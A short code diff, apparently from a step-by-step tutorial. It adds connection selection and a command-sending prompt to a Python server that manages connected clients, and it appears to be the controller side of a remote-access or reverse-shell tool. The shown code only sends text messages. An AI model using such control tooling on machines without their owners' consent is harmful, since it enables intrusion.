@@ -199,9 +199,10 @@ def list_connections():
 
 # Step 17: Define `select_connection()` Function to Select a Connection
 def select_connection(connection_id, get_response):
-    global conn, arrInfo
+    global conn, arrInfo, selectedID
     try:
         connection_id = int(connection_id)
+        selectedID = connection_id
         conn = arrConnections[connection_id]
 
     except: print("[-] Invalid Choice! Please Try Again."); return # noqa
@@ -223,8 +224,16 @@ def select_connection(connection_id, get_response):
 
         return conn
 
+
+# Step 19: Define `send_commands()` Function to Send Commands to the Client
 def send_commands():
-    pass
+    while True:
+        prompt = f"({arrInfo[0]}){arrInfo[1]}@{arrInfo[4]}"
+        strChoice = input(f"[{prompt}]$>> ")
+
+        if strChoice[:3] == '--m' and len(strChoice) > 3:
+            strMsg= 'msg' + strChoice[4:]
+            send(str.encode(strMsg))
 
 
 
